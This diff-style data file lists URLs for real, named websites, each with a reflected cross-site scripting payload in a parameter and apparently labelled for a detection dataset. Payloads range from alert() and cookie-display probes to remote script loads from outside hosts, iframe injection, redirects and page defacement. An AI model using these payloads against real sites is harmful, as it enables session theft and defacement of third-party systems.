+"http://www.codeur.com/index.php?m=recherche&q=projet&motclef=""><script>alert('Xss ByAtm0n3r')</script>&x=7&y=13",0
+"http://undp.org.ye//evaluation.php?are=2&year=%27%22%28%29%26%251%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E",0
+"http://www.raumankameraseura.net/phpu/index.php?s=content&p=history%22%3E%3Cscript%3Ealert%28String.fromCharCode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29%3C/script%3E",0
+http://www.feriaok.com.ec/Avisos/buscar.asp?px=70&txtBuscar=%22%3E%3Cscript%3Ealert%28%22\\.+UR0B0R0X+.%2F%22%29%3B%3C%2Fscript%3E&mCategoria_1=0&x=8&y=15,0
+http://www.forums.mihandownload.com/thread140154.html,0
+"http://home.tudelft.nl/index.php?id=781&q=/""><script>alert('Xss ByAtm0n3r')</script>&searchradio=on&option=START&min=10&start=0",0
+http://www.ccpitzj.gov.cn/showlink_E.php?id=23%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,0
+"http://dclugi.tv/X7Chat/install.php?step=3%22%3E%3Cscript%3Ealert%28String.fromCharCode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29%3C/script%3E",0
+"http://edailystar.com/index.php?date=%27%22%28%29%26%251%22%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E&opt=view&page=17",0
+http://bluebones.net/table.php?id=519<script>alert(42)</script>,0
+http://www.hu.nl/Google/Search.htm?query=fdg%27;alert(%2fJurpie%2f);%2f%2f&category=HUAlles,0
+http://dusheti.org.ge/?l=G&src=1%3CScRiPt%20%3Eprompt%28971806%29%3C%2fScRiPt%3E,0
+http://www.electrolux.se/Global-pages/Search-page/?query=<script>alert(42)</script>,0
+http://www.electrolux.dk/Global-pages/soeg/?query=<script>alert(42)</script>,0
+http://www.electrolux.es/Templates/Main/Pages/SearchPage.aspx?query=<script>alert(42)</script>,0
+http://www.icz.mns.gov.ua/phpinfo.php?a[]=<script>alert(/XSS'd by 03storic/);</script>,0
+"http://www.haus-unterberg.at/admin/gaestebuch/admin/guestbook.admin.php?action=settings&guestbook_id=0&language=german&gmt_ofs=0%22%3E%3Cscript%3Ealert%28String.fromCharCode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29%3C/script%3E",0
+http://www.nh.gov.cn/index.php?a[]=<script>alert(/XSS'd by 03storic/);</script>,0
+"http://basketball.fc-finnentrop.de/fc/guestbook1/admin/guestbook.admin.php?action=settings&guestbook_id=0&language=german&gmt_ofs=0%22%3E%3Cscript%3Ealert%28String.fromCharCode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29%3C/script%3E",0
+http://www.nbstats.gov.cn:8061/info.php?a[]=%3Cscript%3Ealert%28/XSSed%20by%2003storic/%29;%3C/script%3E,0
+http://appleseedinfo.org/search-states.php?filter=CA&statename=California<script>alert(42)</script>,0
+"http://www.domainvc.com/Portfolio.asp?Filter=A""--><script>alert(42)</script><!--",0
+"http://alyssamonks.com/popup/popup.asp?sid=B9E31472-1962-466E-9DA8-2BCDF24F395B&imgname=think-detail-1-web.jpg""><script>alert(42)</script>",0
+http://www.warcraftpets.com/search/,0
+http://www.hbosouthasia.com/search.php?search_name=%22--%3E%3Cscript%3Ealert%28%2Fs%2F%29%3C%2Fscript%3E,0
+http://itv.ge/index.php/%22onmouseover=prompt%28970449%29%3E,0
+"http://www.apple.com/hk/reseller/reseller.php?name=Studio A&cityid=""EN""><iframesrc=""http://xssed.com""><script",0
+http://www.video2mp3.net/afterdownload.php?title=<script>alert(0)</script>,0
+"http://www.amerigoimmo.fr/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.immo-sud.net/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.immo-grambois.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.luberon-ventoux.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.seyne-immobilier.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.cabinet-morliere.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.jager-immobilier.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.accessimmo-cannes.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.troispourcent.com/index.php?lang=en/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.immosprint.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.ergon.fr/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.domians-immobilier.fr/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.terremerimmo.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.agence-europa.fr/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.cpi-immobilier.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.agencedudauphin.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.immob-iles.fr/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.immobilier-hyeres.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+http://wiki.hpc-europa.eu/twiki/bin/view/Main/Atmon3rXss,0
+https://ssl.securecomputing.com/activation.cfm?firewall_id=%22+style%3D%22background-image%3Aurl%28%27http%3A%2F%2Fi.imgur.com%2FoHp8A.gif%27%29%22+onfocus%3D%22document.write%28String.fromCharCode%2860%29%2B%27iframe+src%3Dhttp%3A%2F%2Fr14nulr00t.blogspot.com+height%3D100%25+width%3D100%25%3E%27%2BString.fromCharCode%2860%29%2B%27%2Fiframe%3E%27%2BString.fromCharCode%2860%29%2B%27script%3Ealert%28%2FXSS+%2F%29%27%2BString.fromCharCode%2860%29%2B%27%2Fscript%3E%27%29%22+foo%3D%22bar,0
+"http://casino.peoples.it/?homeRealm=http://www.kpoker.it/&s=%22%3E%3Cvideo%20src=1%20onerror=alert%28String.fromCharCode%28112,97,115,115,101,100%29%29%20%3Ehttp://www.kpoker.it/",0
+http://calendario.peoples.it/lepokerine/common/video_gallery.php?id=1%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E%3C%22,0
+http://www.besancon-tourisme.com/fr/no/moteur-de-recherche.html?frmMoteurSearch_search=%2F%22%3E%3Cscript+type%3D%22text%2Fjavascript%22+src%3D%22http%3A%2F%2Fvuln.xssed.net%2Fthirdparty%2Fscripts%2Fckers.org.js%22%3E%3C%2Fscript%3E,0
+http://www.ulg.ac.be/cms/j_15081/portail-infos?text=%3C/script%3E%3Ciframe%20src=%22http://xssed.com%22%3E&types=generated.Actualite&types=generated.ActualiteWebTV&types=generated.Agenda&types=generated.AgendaAnneeDesLangues&types=generated.AgendaFacultaire&types=generated.CommuniqueDePresse&types=generated.EvenementProtocolaire&types=generated.GaleriePhotos&types=generated.Page&textSearch=true&searchInFiles=true&mode=any&portlet=j_5895&portlet=j_5895,0
+"http://www.chirac-en-lozere.com/fr/search?query=""><script>alert('Xss By Atm0n3r')</script>&x=0&y=0",0
+http://iaeste.ut.ac.ir/Login/login_server.asp?msgHandler=%3Cscript%3Ealert%28%27xss%27%29;%3C/script%3E,0
+"http://www.gemax.rs/sr/info/news.html?view=comment&topicId=170&type=""/><script>alert(document.cookie)</script>",0
+"http://www.21dan.com/sr/saznajVise/teme.html?view=comment&topicId=14206&type=""/><script>alert(document.cookie)</script>",0
+"http://www.sam.org.rs/sr/events/previousEvents.html?view=comment&topicId=500&type=""/><script>alert(document.cookie)</script>",0
+"http://www.gookombat.com/training-search?domain=""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.accessimmobilier.fr/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+http://www.palaisdor.com/recherche2.php?unite=%3Ciframe%20src=http://xssed.com%3E,0
+"https://store.babylon.com/checkout.php?qty_7563=1&vat_country=NO""><script>alert(document.cookie)</script>",0
+http://slsweb.ocmboces.org/resGetway.asp?id=8&topic=%3Cscript%3Ealert%281%29;%3C/script%3E,0
+http://www.crytek.com/search/node/%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://www.guadeloupe.franceantilles.fr/recherche/index.php?texte=%22%3E%27%3E%3C/title%3E%3Cscript%3Ealert%28%22XSS%27D%20by%20a%20tapz%20:%29%22%29%3C/script%3E&x=0&y=0,0
+"http://www.ikarus.at/en/business/community/blog/index.html?blog='""--></style></script><script>alert(""XSS"")</script><script>window.location.assign(""http://www.reddit.com/r/xss/"")</script>&action=detail",0
+http://www.careerminded.com/default.php?id=108%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3CSCRIPT%20SRC=http://lupbot.comule.com/aSU_aBANGjs.js%3E%3C/SCRIPT%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Ealert%28%22XSS%20DETECTED%20XCode%20Exploit%20Scanner%22%29%3C/script%3E,0
+http://developer.cisco.com/web/webdialer/wikidocs?p_p_id=1_WAR_wikinavigationportlet_INSTANCE_veD7&p_p_lifecycle=0&p_p_state=normal&p_p_mode=view&p_p_col_id=column-1&p_p_col_count=1&p_r_p_185834411_nodeId=803209&p_r_p_185834411_title=%22%3E%3Ch1%3ECross-Site%20Scripting%20@matiaslonigro%3C/h1%3E%3Cscript%3Ealert%28/xss/%29%3C/script%3E,0
+http://www.mtgsy.net/kb/default.php?ID=3046%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3CSCRIPT%20SRC=http://lupbot.comule.com/aSU_aBANGjs.js%3E%3C/SCRIPT%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Ealert%28%22XSS%20DETECTED%20XCode%20Exploit%20Scanner%22%29%3C/script%3E,0
+http://mur.jpl.nasa.gov/images_nca.php?product=%22%3E%3C/script%3E%3Ch1%3ECross-Site%20Scripting%20-%20@matiaslonigro%3Cbr%3E%3CsCript%3Ealert%28/xss/%29%3C/ScRIPT%3E,0
+http://mmptdpublic.jsc.nasa.gov/jscnano/default.asp?content=Events&l1=9&l2=0&l3=0%22%3E%3C/script%3E%3Ch1%3ECross-site%20Scripting%20-%20@matiaslonigro%3C/h1%3E%3Cscript%3Ealert%28/xss/%29%3C/ScRIPT%3E,0
+http://www.adele.tv/photos/?s=photos&page=1&photo=%22%3E%3Ch1%3ECross-Site%20Scripting-%3Ca%20href=%22http://www.twitter.com/matiaslonigro%22%3E@matiaslonigro%3C/h1%3E%3Cscript%3Ealert%28/Xss/%29%3C/ScRIPT%3E,0
+http://diskon.com/index.php?action=%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E,0
+http://lifescience.nuk.edu.tw/test.php?a[]=<script>alert(/XSS/);</script>,0
+http://student.valpo.edu/cchen/test.php?a[]=<script>alert(/XSS/);</script>,0
+"http://www.argointl.com/index.php?p=9&industry=0&search=""><script>alert(42)</script><p alt=""&x=0&y=0",0
+http://icc-cricket.yahoo.net/press_zone/terms.php?logo=</script><script>alert(document.cookie)</script>,0
+http://drweb.com/drweb+samag/konkurs/news/?c=29&i=1851&lng=ru&p=%22onmouseover=prompt%28/XSS/%29%20bad=%22,0
+"http://www.popularscreensavers.com/search.jhtml?q=""><script>alert(document.cookie)</script>",0
+http://www.poker-academie.com/poker/replayer/replayer.php?i=388101&p=9ec5f169&s=10%27%3E%3Cimg%20src=tapz%20onerror=alert%281337%29%20/%3E,0
+http://webmail.mep.pandasecurity.com/index.php?f_email=%22%3E%3Cscript%3Ealert%28/XSS%20by%2003storic/%29%3C/script%3E,0
+"http://www.mcdonalds.com/us/en/promotions/caramel.emailform.html?currentPageUrl=http%3A%2F%2F216.255.66.122%2Fus%2Fen%2Fpromotions%2Fcaramel.html&currentPagePath=%2Fcontent%2Fus%2Fen%2Fpromotions%2Fcaramel&currentPageTitle=""><script>alert(document.cookie)</script",0
+http://photos.oscars.org/allimages.php?events=&gpl=current&pg=2%22%3E%3Cscript%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2Fscript%3E%3Cimg%20src=http://thumbs.reddit.com/t5_2qhx7.png%3E,0
+http://www.playboy.com/search?s=%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E%3Cimg%20src=%22,0
+http://www.youjizz.com/search/%22/%3E%3Cscript%3Ealert%281%29%3C/script%3E-1.html,0
+http://webcalendar.git.sourceforge.net/git/gitweb.cgi?p=webcalendar/webcalendar;a=summary'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3Cscript%3Ewindow.location.assign(%22http://www.reddit.com/r/xss/%22)%3C/script%3E,0
+http://developer.cisco.com/web/cdc/search?p_p_id=3&p_p_state=maximized&_3_struts_action=/search/search&_3_keywords=%22%3E%3Ch1%3ECross-Site%20Scripting%20@matiaslonigro%3C/h1%3E%3Cscript%3Ealert%28/xss/%29%3C/script%3E,0
+http://www.airbus.com/tools/search/?tx_indexedsearch[submit_button]=Go&tx_indexedsearch[sword]=%22%3E%3Cu0ZBQ%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Ca%20href=%22,0
+http://es.blackberry.com/newsroom/success/case_study.jsp?title=The_Office_of_the_Spanish_Prime_Minister&case=%22%3C/script%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Cscript%3E%20%22,0
+http://www.net-security.org/reviews.php/%22%3E%3CSCRIPT%20SRC=http://pastehtml.com/view/bmx7j4y8m.txt%3E%3C/SCRIPT%3E,0
+"http://libguides.bodleian.ox.ac.uk/searchtags.php?iid=&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+"http://answers.usa.gov/system/selfservice.controller?CONFIGURATION=1001&PARTITION_ID=1&CMD=STARTPAGEFRAMELESS&TIMEZONE_OFFSET=%22%3E%3C/scRipT%3E%3CscRipT%3Eeval(String.fromCharCode(99,111,110,102,105,114,109,40,34,88,83,83,45,66,71,34,41,59));%3C/scRipT%3E%3Cscript%3Edocument.body.innerHTML=%22%3Cstyle%3Ebody{visibility:hidden;%20background:black;}%3C/style%3E%3Cdiv%20style=visibility:visible;%3E%3Ccenter%3E%3Ch1%3E%3Cfont%20color='white'%3EPlease%20fix%20your%20%3C/font%3E%3Cfont%20color='red'%3E%20XSS%20%3C/font%3E%3Cfont%20color='white'%3E!%3C/font%3E%3C/h1%3E%3Cfont%20color='white'%3EBest%20regards%20from%20Bulgaria!%3Ch1%3E%3Cfont%20color='red'%3E%20%20flexxpoint%3C/font%3E%3C/h1%3E%3Cbr%3E%22;%3C/script%3E",0
+http://boourns.cjb.net/images.php?tag=%22%3E%3Cscript%3Ealert%28/xss/.source%29%3C/script%3E,0
+"http://www.omgtorrent.com/search.php?mot_cle=/""><script>alert(1)</script>",0
+"http://www.immo-camargue.com/index.php?lang=en/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.action-collective.com/action/categorie.php?txt_recherche=/""><script>alert('Xss ByAtm0n3r')</script>&x=13&y=8&id_cat=0&txt_geo=0",0
+"http://www.bad-elster.com/suche.php?query_string=""><script>alert(""CrossSiteScripting2"")</script>",0
+"http://zjh.dalang.gov.cn/about.php?id=<script>alert(""XSS"");</script>",0
+"http://www.puma.com/running/products?product_search[keyword]=research""><script>alert(/vulnerability/)</script>",0
+"http://www.educacao.rs.gov.br/pse/html/noticias_det.jsp?ID=8%27%3Cscript%3Ealert%28String.fromCharCode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29;//%3C/script%3E",0
+http://www.ancyl.org.za/search.php?search=%22%3E%3CSCRIPT%20SRC=http://pastehtml.com/view/bmx7j4y8m.txt%3E%3C/SCRIPT%3E&sa=,0
+https://www.sparktrust.com/sparktrustcertified/account/signup?continue=stc_createaccount_step1&completion=stc_thankyou%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&activate=&rcID=0&signupType=freeReport&workflow=freeReport,0
+"http://rexbd.net/pagerank/index.php?url=enitec.co.jp/home/sql.php?id=%22-%27%3Cscript%3Ealert%28String.fromCharCode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29;//%3C/script%3E",0
+http://www.computerworld.com/s/newsletters?source=nlt_nav%22'--%3E1%3CScRiPt%20%3Eprompt(%22XSS%22)%3C/ScRiPt%3E%3C!--,0
+http://pastehtml.com/api/facebook_login?go='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(/i%20cant%20block/)%3C/script%3E%3Ciframe%20src=http://www.reddit.com/r/xss/%20height=100%25%20%20%20width=100%25%3E,0
+http://www304.americanexpress.com/getthecard/home?sj_tabToOpen=1'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E%3Ciframe%20src=http://www.reddit.com/r/xss/%20height=100%25%20%20%20width=100%25%3E&inav=menu_cards_pc_choosecard#for-your-lifestyle,0
+"https://www.website.ws/orderflow/index.dhtml?sponsor=""><font+size=55+color=red>HackedBy+E400</font><script>alert(/E400 W4S H3R3/)</script>",0
+"http://paramountapts.com/map.aspx?address=2385 CarlingAvenue&name=""><script>alert(document.cookie)</script>",0
+http://grabandrun.com/download-mp3/<img onerror=alert(document.cookie) src=//>/1,0
+"http://www.mystyle.com/mystyle/games/index.jsp?game=""><script>alert(document.cookie)</script>",0
+http://surfpack.com/li_wikipedia_><script>alert(document.cookie)</script>,0
+"http://www.marnys.com/conoce.asp?leng=en""><script>alert(document.cookie)</script>",0
+"http://en.theshoppingassistant.com/?domain=fff.com""><script>alert(document.cookie)</script>&country=ee&number=",0
+"http://www.jajja.com/?s=""><script>alert(document.cookie)</script>",0
+"http://www.nordkeyboards.com/main.asp?tm=Products&clpm=Nord_Stage_2""><script>alert(document.cookie)</script>",0
+"http://www.cygrids.com/sv/Objects/Sok/?quicksearchquery=""><script>alert(document.cookie)</script>",0
+"http://en.gamersgate.com/games?prio=relevance&q=""><script>alert(document.cookie)</script>",0
+"http://www.barnebys.com/Search?q=""><script>alert(document.cookie)</script>&c=5&r1=26",0
+"http://www.cybercom.com/Online-excellence/Campaigns/Webbdagarna2011/email.aspx?id=""><script>alert(document.cookie)</script>",0
+"http://www.booking.com/hotel/""><script>alert(document.cookie)</script>/",0
+http://tweetscan.com/index.php?s=><script>alert(document.cookie)</script>,0
+http://www.newsomart.com/image.php?id=625%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+"http://www.citibus.fr/exec/recherche.asp?motcle=/""><script>alert(1)</script>",0
+http://www.andrewbrooksphotography.com/image.php?ID=647%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+"http://www.smh.com.au/execute_search.html?text=%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83,32,48,51,115,116,111,114,105,99%29%29%3C/SCRIPT%3E&ss=smh.com.au",0
+"http://www.torrent-francais.com/search-torrent.php?keyword=/""><script>alert('Xss ByAtm0n3r')</script>&x=55&y=5",0
+"http://www.xwiki.org/xwiki/bin/view/DownloadCode/DownloadFeedback?downloadLink=http://download.forge.objectweb.org/xwiki/xwiki-enterprise-installer-windows-3.4.exe&projectType=Stable&projectVersion=3.4%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E&projectID=1",0
+http://www.9news.com/news/default.aspx?%22%3E%3C/fb:like%3E%3C/li%3E%20%3Ciframe%20src=%22javascript:alert(/xss/)%22/%3E%20%3C,0
+http://voydod.uz/search_media.php?search=1--%3E+1%3CScRiPt+%3Ealert%28%22XSS+03storic%22%29%3C%2FScRiPt%3E&range=all,0
+http://www.webcalc.com.br/frame.asp?pag=javascript:alert('XSSED'),0
+http://www.tubeclipz.com/search/?q=%22%3E%3Cscript%3Ealert%28%22pwned%22%29%3C/script%3E&channel=,0
+"http://www.ted.com/speakers?alphabylastname=F""><script>alert(document.cookie)</script>",0
+"http://www.masht-gov.net/advCms/?id=30&lng=Alb?ref=GoogleYuz.Com%27%3Cscript%3Ealert%28String.fromCharCode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29;//%3C/script%3E",0
+http://www.ferrari.com/English/Formula1/Search/Pages/AllCategories.aspx?k=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E,0
+"http://news.adidas.com/ContentPage/SendEmail.aspx?Name='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(66,101,115,116,32,114,101,103,97,114,100,115,32,102,114,111,109,32,66,117,108,103,97,114,105,97))%3C/script%3E'%22%3E%3Cscript%3Edocument.body.innerHTML=%22%3Cstyle%3Ebody{visibility:hidden;%20background:black;}%3C/style%3E%3Cdiv%20style=visibility:visible;%3E%3Ccenter%3E%3Ch1%3E%3Cfont%20color='white'%3EPlease%20fix%20your%20%3C/font%3E%3Cfont%20color='red'%3E%20XSS%20%3C/font%3E%3Cfont%20color='white'%3E!%3C/font%3E%3C/h1%3E%3Cfont%20color='white'%3EBest%20regards%20from%20Bulgaria!%3Ch1%3E%3Cfont%20color='red'%3E%20%20flexxpoint%3C/font%3E%3C/h1%3E%3Cbr%3E%22;%3C/script%3E",0
+"http://shop.reebok.com/GB/mens/all?f.Collection=cc_na_eu'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(66,101,115,116,32,114,101,103,97,114,100,115,32,102,114,111,109,32,66,117,108,103,97,114,105,97))%3C/script%3E'%22%3E%3Cscript%3Edocument.body.innerHTML=%22%3Cstyle%3Ebody{visibility:hidden;%20background:black;}%3C/style%3E%3Cdiv%20style=visibility:visible;%3E%3Ccenter%3E%3Ch1%3E%3Cfont%20color='white'%3EPlease%20fix%20your%20%3C/font%3E%3Cfont%20color='red'%3E%20XSS%20%3C/font%3E%3Cfont%20color='white'%3E!%3C/font%3E%3C/h1%3E%3Cfont%20color='white'%3EBest%20regards%20from%20Bulgaria!%3Ch1%3E%3Cfont%20color='red'%3E%20%20flexxpoint%3C/font%3E%3C/h1%3E%3Cbr%3E%22;%3C/script%3E",0
+"http://lance.nasa.gov/?s=<SCRIPT>alert(""xss"");//</SCRIPT>",0
+http://gaia.esa.int/science-e/www/object/index.cfm?fobjectid=44972&farchive_objecttypeid=12&farchive_objectid=%22%3E%3Cscript%3Ealert%281337%29%3C/script%3E&fareaid_2=63,0
+http://earth.eo.esa.int/cgi-bin/satimgsql.pl?search=%22%3E%3Cscript%3Ealert%281337%29%3C/script%3E,0
+http://www.beretta.com/shot-show-2012/index.aspx?m=53&f=30&Testo=%22%3E%3Cscript%3Ealert%28%22XSS--Prashant%22%29%3C%2Fscript%3E&x=0&y=0&Lingua=eng&authid=A47F6EF99482DA58545120D8983737,0
+http://xmm.vilspa.esa.es/cgi-bin/ept/preview.pl?camSelect=%22%3E%3Cscript%3Ealert%281337%29%3C/script%3Ejoined&fluxVersion=xmmsas_20090615_1801-9.0.0_release&target=all&thumb=on&action=showAllJoints&chandra=0&suzaku=0,0
+http://www.gibraltar.gov.gi/?fontstyle=%22%20onmouseover%3dalert%28%22XSS%22%29%20bad%3d%22,0
+http://wibiyasupport.conduit.com/access?return_to=http://www.bing.com,0
+http://videosearch.comcast.net/ss-query/videosearch.jsp?q=movie&contentId=1285086510&con=&cp=4&sId=null&title=%22%3E%3Cscript%3Ealert%28%22test%22%29%3C/script%3E,0
+http://www.floodsmart.gov/floodsmart/pages/email/agent/emailAgent.jsp?name=%22%3E%3Cscript%3Ealert%28%22z9%22%29%3C/script%3E,0
+http://olx.fotolog.com/nf/alerts.php?category=0_&alert_keyword=%22%27%3E%3Cimg%20src=vul%20onerror=alert%28%27XSSed_by_R007k17-w%27%29%3E,0
+http://mmoloda.com/mabinogiheroes/image.php?id=144%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://bishart.net/image.php?id=127%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+"http://earthdata.nasa.gov/search?term=<SCRIPT>alert(""xss"");//</SCRIPT>&site[1]=1&form_id=search-earthdata",0
+"http://www.contag.de/suchergebnisse.php?suchwort=""><script src=http://ompldr.org/vY25rYw></script>",0
+"http://top-media.de/start/suchergebnisse.php?suchworte=""><scriptsrc=http://ompldr.org/vY25rYw></script>&auswahl=&Submit=suchen",0
+http://acehprov.go.id/Search?q=%3Ciframe%20src=%22http://17movie.blogspot.com/2012/01/video-mesum-sma-di-kediri-beredar-luas.html%22%3E,0
+http://chedet.cc/ads/www/delivery/ck.php?oaparams=2__bannerid=18__zoneid=1__cb=659325d633__oadest=http://www.xssed.com,0
+http://www.nochild.org/child-list.php?loc=Kenya&p=2%3Ciframe%20src=%22http://xssed.com%22%3E,0
+http://www.cyprien.fr/?s=</title><script>alert(1337)</script>,0
+http://www.dorfblick-badgriesbach.de/admin/data/tiny_mce/plugins/ibrowser/scripts/popup.php?url=http://data.xssed.org/images/xssed_logo.gif,0
+http://spd.imelztal.de/winden/index.php/WikiFarmsSite/WikiSandbox?from=%22/><bodyonload=alert(43727373537453637270746732)>,0
+http://www2.hu-berlin.de/psychologie/ingpsycscw/MethWiki/pmwiki.php?n=Main.WikiSandbox?from=%22/><body onload=alert(43727373537453637270746732)>,0
+http://torrentleech.org/user/chat/guest?username=%2F%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&Submit=Chat,0
+http://search.conduit.com/results.aspx?q=Columbus&Suggest=&stype=Results&FollowOn=True&SelfSearch=1&SearchType=%22%27%3E%3Cimg%20src=vul%20onerror=alert%28%27r007k17-w%27%29%3E&SearchSource=32&ctid=%22%27%3E%3Cimg%20src=vul%20onerror=alert%28%27r007k17-w%27%29%3E&octid=%22%27%3E%3Cimg%20src=vul%20onerror=alert%28document.domain%29%3E,0
+"http://wibiya.conduit.com/SupportLogin.php?locale_id=1&return_to=""'><img src=vulonerror=alert('vulnerabilitylab')>&timestamp=%22%27%3E%3Cimg%20src=vul%20onerror=alert%28%27vulnerabilitylab%27%29%3E",0
+"http://images.search.conduit.com/search?q=dsfs&ctid=""'><img src=vulonerror=alert('r007k17-w')>&searchsource=32",0
